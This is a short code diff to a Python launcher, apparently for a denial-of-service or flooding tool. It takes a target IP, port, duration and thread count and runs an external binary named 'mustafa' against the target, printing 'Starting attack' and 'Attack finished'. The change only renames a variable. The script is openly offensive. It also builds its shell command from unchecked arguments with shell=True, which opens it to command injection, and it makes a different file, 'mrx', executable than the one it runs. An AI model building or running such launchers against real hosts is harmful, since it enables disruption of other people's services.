@@ -7,14 +7,14 @@ def main():
         print("Usage: python3 main.py <ip> <port> <time> <threads>")
         sys.exit(1)
     
-    ip, port, duration, threads = sys.argv[1:6]
+    ip, port, time, threads = sys.argv[1:6]
     
     if os.path.exists("mrx"):
         os.chmod("mrx", 0o755)
     
     print(f"Starting attack on {ip}:{port}")
     
-    result = subprocess.run(f"./mustafa {ip} {port} {duration} {threads}", shell=True)
+    result = subprocess.run(f"./mustafa {ip} {port} {time} {threads}", shell=True)
     
     print(f"Attack finished")
 
